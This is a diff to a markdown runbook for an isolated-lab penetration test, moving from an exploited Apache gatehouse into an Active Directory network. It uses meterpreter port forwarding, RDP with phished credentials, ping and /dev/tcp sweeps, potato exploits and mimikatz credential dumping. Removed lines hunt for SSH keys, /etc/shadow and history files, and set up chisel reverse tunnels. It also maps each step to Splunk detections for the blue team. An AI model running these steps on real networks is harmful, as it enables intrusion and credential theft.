@@ -3,39 +3,46 @@
 > ISOLATED LAB ONLY. Authorised assessment. Host-only network.
 
 Runbook for moving from the gatehouse foothold into the internal network and
-escalating. Chosen approach: **`ssh -D` dynamic SOCKS** for the pivot, **RDP as
-`persephone`** for lateral access.
+escalating. Chosen approach: **meterpreter `portfwd`** for the pivot (runs over the
+existing C2 session from Phase 5 — no SSH credential needed) + **RDP as `persephone`**
+for lateral access.
 
 ## Where we start
 
 ```
 Kali (attacker)
-  │  foothold: reverse shell as `daemon` (Apache 2.4.49 CVE RCE)
+  │  foothold: meterpreter session on the gatehouse
+  │  (Phase 5: apache_normalize_path_rce -> linux/x64/meterpreter/reverse_tcp)
   ▼
 Gatehouse 10.1.1.10  (Ubuntu, DUAL-HOMED: DMZ 10.1.1.x + internal 192.168.1.x)
-  │  nmap already installed here
   ▼
 Internal 192.168.1.0/24
   - DC            192.168.1.100   (hades.underworld)
+  - Workstation   192.168.1.103   (domain-joined, Blue Team / victim)
   - Splunk        192.168.1.6
-  - Workstation   192.168.1.??    <- to be built + domain-joined
 ```
 
-AD creds (from phishing the victim): `persephone / Demeter01!` — **normal** domain user, can RDP.
-Other wardens share `Ferryman1!`: `charon`, `cerberus`, `minos`, `hades`.
+AD creds (from phishing `persephone`): `persephone / Demeter01!` — **normal** domain
+user, authorised for RDP on .103. Other wardens share `Ferryman1!`: `charon`,
+`cerberus`, `minos`, `hades`. No warden is a domain admin → escalation is local on the
+workstation (or promote `hades` to Domain Admin later).
+
+> **Why `portfwd`, not `ssh -D`.** Phase 5 lands a **meterpreter** session, not an SSH
+> login, so we tunnel over the C2 we already have — no need to find or crack an SSH
+> credential on the gatehouse. It is also quieter there: no `auth.log` login line, just
+> the existing session (see `docs/blue-team-detection.md` §6).
 
 ---
 
-## Step 1 — Stand up + domain-join a Windows workstation (VM console / noVNC)
+## Step 1 — Stand up + domain-join the Windows workstation (.103)  (VM console / noVNC)
 
 Do this at the VM console, not over the pivot.
 
 1. Build a Windows 10/11 VM on the **internal** vSwitch (192.168.1.0/24).
-2. Point DNS at the DC (required for domain discovery):
+2. Point DNS at the DC (required for domain discovery) and set the static IP:
    ```powershell
    Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.1.100
-   # optional static IP:
-   # New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.50 -PrefixLength 24 -DefaultGateway 192.168.1.1
+   New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.103 -PrefixLength 24 -DefaultGateway 192.168.1.1
    ```
 3. Join the domain (use an account allowed to join, e.g. `hades`):
    ```powershell
@@ -48,62 +55,67 @@ Do this at the VM console, not over the pivot.
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member "HADES\persephone"
    ```
+> **Gotcha:** if the network profile is **Public**, the firewall drops the pivot's
+> traffic to `filtered`. Fix it:
+> `Set-NetConnectionProfile -InterfaceAlias "Ethernet" -NetworkCategory Private`.
 
-## Step 2 — Internal recon from the foothold (on the gatehouse, as `daemon`)
+## Step 2 — Internal recon from the foothold  (meterpreter -> `shell` on the gatehouse)
 
-nmap is already on the gatehouse (installed by `install_apache.sh`).
-
-```bash
-nmap -F -Pn 192.168.1.0/24                          # live hosts + top ports
-nmap -p 3389,445,5985,88,389,636 -Pn 192.168.1.0/24 # RDP / SMB / WinRM / DC
-```
-Confirm the DC (88/389/636), Splunk (.6), and the workstation (3389 open).
-
-## Step 3 — Get an SSH credential on the gatehouse  (dependency for `ssh -D`)
-
-`daemon` (RCE) is not an SSH login. `ssh -D` needs a real SSH account on 10.1.1.10.
-In-lab routes, easiest first:
+A full nmap sweep of the `/24` as an unprivileged connect scan takes ~1h — too slow.
+**Primary method is a fast ping sweep:**
 
 ```bash
-# local accounts with a shell
-grep -E 'sh$' /etc/passwd ; ls -la /home
-# readable creds/keys as daemon
-find / -name 'authorized_keys' -o -name 'id_*' 2>/dev/null
-cat cgi-bin/login.py | grep -i -E 'AD_|pass|bind'   # AD bind config
-cat db/setup_db.sh db/schema.sql | grep -i -E 'pass|styx|hades_app'
-cat /home/*/.bash_history 2>/dev/null
+for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i | grep "bytes from"; done
 ```
-- Try the admin/sudo user that built the box (the one who ran `sudo ./install_apache.sh`) — check for a reused lab password (`Ferryman1!` / `Demeter01!`).
-- If you can escalate `daemon` → user/root: append your Kali pubkey to that user's
-  `~/.ssh/authorized_keys`, or read `/etc/shadow` and crack offline.
-
-**Goal:** `ssh <user>@10.1.1.10` works.
-**Fallback if no SSH cred:** pivot with `chisel` or `ligolo-ng` straight from the
-`daemon` shell (no creds needed) — see note at the bottom.
-
-## Step 4 — Dynamic SOCKS pivot (`ssh -D`) from Kali
-
-The gatehouse is dual-homed, so its sshd reaches 192.168.1.0/24 for you — no IP
-forwarding to set up.
+Runs unprivileged. **Caveat:** Windows Defender Firewall drops ICMP echo by default, so
+live Windows hosts may not answer. If the sweep is thin, confirm with a TCP sweep to
+ports that *do* answer:
 
 ```bash
-ssh -D 1080 -N <user>@10.1.1.10        # opens SOCKS5 on 127.0.0.1:1080
+for i in $(seq 1 254); do for p in 445 3389; do (timeout 1 bash -c "echo > /dev/tcp/192.168.1.$i/$p" 2>/dev/null && echo "192.168.1.$i:$p") & done; done; wait
 ```
-proxychains (`/etc/proxychains4.conf`): `socks5 127.0.0.1 1080`
-```bash
-proxychains nmap -Pn -p3389 192.168.1.50   # sanity check through the tunnel
-```
-
-## Step 5 — RDP lateral as `persephone`
+Then run nmap only against the confirmed live hosts (fast — two targets, not 254):
 
 ```bash
-proxychains xfreerdp /u:persephone /d:hades.underworld /p:'Demeter01!' \
-  /v:192.168.1.50 /cert:ignore +clipboard /dynamic-resolution
+nmap -Pn -sV -p- --open -T4 192.168.1.100,192.168.1.103   # DC + workstation
 ```
-(RDP over SOCKS can be laggy. Painless alternative while you have the cred:
-`proxychains evil-winrm -i 192.168.1.50 -u persephone -p 'Demeter01!'` if WinRM/5985 is open.)
+Confirm the DC (88/389/445), the workstation (.103, 3389 open) and Splunk (.6).
 
-## Step 6 — Local privilege escalation on the workstation
+## Step 3 — Pivot: forward RDP over the meterpreter session (`portfwd`)
+
+In the meterpreter session on the gatehouse, forward the workstation's RDP port to a
+local port on Kali:
+
+```
+meterpreter > portfwd add -l 13389 -p 3389 -r 192.168.1.103
+```
+- `-l 13389` — local listener opened on **Kali** (127.0.0.1:13389)
+- `-p 3389`  — the remote port (RDP on the workstation)
+- `-r 192.168.1.103` — the workstation, reachable only from the dual-homed gatehouse
+
+Traffic path:
+```
+Kali (xfreerdp3 -> 127.0.0.1:13389)
+   │   meterpreter tunnel (existing C2 session)
+   ▼
+Gatehouse 10.1.1.10 ── internal leg ──► Windows .103 : 3389 (RDP)
+```
+Manage forwards with `portfwd list` and
+`portfwd delete -l 13389 -p 3389 -r 192.168.1.103`.
+
+## Step 4 — RDP lateral as `persephone`
+
+Point the RDP client at **your own Kali** (the local forward), not at the workstation IP:
+
+```bash
+xfreerdp3 /u:persephone /d:hades.underworld /p:'Demeter01!' \
+  /v:127.0.0.1:13389 /cert:ignore +clipboard /dynamic-resolution
+```
+(On Kali the binary is `xfreerdp3`, FreeRDP v3. WinRM alternative while you have the
+cred, if 5985 is forwarded the same way with another `portfwd add -l 15985 -p 5985 -r 192.168.1.103`:
+`evil-winrm -i 127.0.0.1 -P 15985 -u persephone -p 'Demeter01!'`.)
+
+## Step 5 — Local privilege escalation on the workstation
 
 As `persephone` (normal user), enumerate then escalate:
 
@@ -117,10 +129,12 @@ reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 - Run **winPEAS** for unquoted service paths, writable service binaries, scheduled
   tasks, stored creds.
 - If `SeImpersonatePrivilege` is present → PrintSpoofer / GodPotato.
-- Once local admin → dump cached creds (LSASS/mimikatz) and move toward the DC with
-  the `hades` credential via PsExec/WinRM.
+- Once local admin → dump cached creds (LSASS/mimikatz) and move toward the DC with the
+  `hades` credential via PsExec/WinRM.
 
-## Step 7 — Blue team / Splunk detection mapping
+## Step 6 — Blue team / Splunk detection mapping
+
+> Full map (Sysmon-for-Linux + Windows + pfSense + SPL): **`docs/blue-team-detection.md`**.
 
 The assessment asks you to assess defensive controls. Document what each technique
 generates (Windows Security log → Splunk 192.168.1.6):
@@ -128,18 +142,14 @@ generates (Windows Security log → Splunk 192.168.1.6):
 | Technique | Event / log | Where to see it |
 |---|---|---|
 | Domain join | 4741 (computer acct created), 4624 | DC security log |
-| RDP logon (persephone) | **4624 Logon Type 10** (RemoteInteractive), 4778 | Workstation |
-| Failed RDP | 4625 Type 10 | Workstation |
-| SSH pivot | `Accepted password/publickey` | Gatehouse `/var/log/auth.log` |
-| Internal nmap sweep | connection spikes / IDS, pfSense cross-zone logs | pfSense / Splunk |
-| winPEAS / mimikatz | 4688 proc creation; Sysmon EID 1; LSASS access Sysmon EID 10 | Workstation |
+| RDP logon (persephone) | **4624 Logon Type 10** (RemoteInteractive), 4778 | Workstation .103 |
+| Failed RDP | 4625 Type 10 | Workstation .103 |
+| `portfwd` pivot (RDP) | meterpreter C2 session + gatehouse -> `192.168.1.103:3389` (Sysmon-for-Linux EID 3) | Gatehouse / pfSense |
+| Internal ping / TCP sweep | connection spikes, pfSense cross-zone logs | pfSense / Splunk |
+| winPEAS / mimikatz | 4688 proc creation; Sysmon EID 1; LSASS access Sysmon EID 10 | Workstation .103 |
 
-Example SPL: `index=* EventCode=4624 Logon_Type=10` to catch the RDP lateral move.
+**Source IP of the 4624 Type 10** on .103 = the internal IP of the **gatehouse** (the
+hop exits the Ubuntu via `portfwd`), not Kali → a workstation receiving RDP from a DMZ
+server is a strong anomaly.
 
----
-
-### Note — pivot fallback (no SSH cred)
-
-If Step 3 yields nothing, skip `ssh -D` and tunnel from the `daemon` foothold:
-- **chisel:** `chisel server -p 8000 --reverse` on Kali; `chisel client KALI:8000 R:1080:socks` on the gatehouse. Then proxychains as in Step 4.
-- **ligolo-ng:** proxy on Kali, agent on the gatehouse → full tun interface to 192.168.1.0/24 (nicer for RDP than SOCKS).
+Example SPL: `index=* EventCode=4624 Logon_Type=10` catches the RDP lateral move.
